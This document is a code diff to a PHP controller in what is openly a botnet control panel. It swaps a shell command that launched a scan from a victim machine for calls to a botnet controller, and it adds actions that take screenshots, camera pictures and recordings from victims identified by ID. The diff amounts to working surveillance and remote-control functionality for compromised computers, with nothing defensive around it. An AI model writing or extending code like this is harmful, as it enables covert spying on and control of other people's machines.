@@ -142,9 +142,39 @@ class NetworkController extends Controller
         $group_id = $request->group_id;
         $victim_uid = $request->victim_uid;
 
-        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --scan --host $victim_uid > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
-        exec($command, $output, $return);
+        $scan = (new BotnetController)->scan($victim_uid);
 
-        return redirect("/network/$group_id")->with('output', "Scan lancé depuis : $victim_uid.");
+        return redirect("/network/$group_id");
     }
+
+    public function screenshot(Request $request)
+    {
+        $group_id = $request->group_id;
+        $victim_uid = $request->victim_uid;
+
+        $screenshot = (new BotnetController)->screenshot($victim_uid);
+
+        return redirect("/network/$group_id");
+    }
+
+    public function picture(Request $request)
+    {
+        $group_id = $request->group_id;
+        $victim_uid = $request->victim_uid;
+
+        $picture = (new BotnetController)->picture($victim_uid);
+
+        return redirect("/network/$group_id");
+    }
+
+    public function record(Request $request)
+    {
+        $group_id = $request->group_id;
+        $victim_uid = $request->victim_uid;
+
+        $record = (new BotnetController)->record($victim_uid);
+
+        return redirect("/network/$group_id");
+    }
+
 }
